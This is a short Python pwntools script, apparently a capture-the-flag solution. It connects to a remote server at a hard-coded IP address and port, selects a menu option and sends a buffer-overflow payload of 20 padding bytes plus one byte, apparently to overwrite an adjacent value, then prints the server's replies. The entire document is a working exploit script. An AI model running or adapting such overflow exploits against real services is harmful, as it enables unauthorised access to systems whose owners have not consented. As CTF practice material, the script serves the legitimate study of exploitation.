from pwn import *

io = remote('188.166.233.168', 4791)

payload = b'A'*20+b'\x31'
print(io.recv())
io.sendline(b'1')
print(io.recv())
io.sendline(payload)
print(io.recvall())
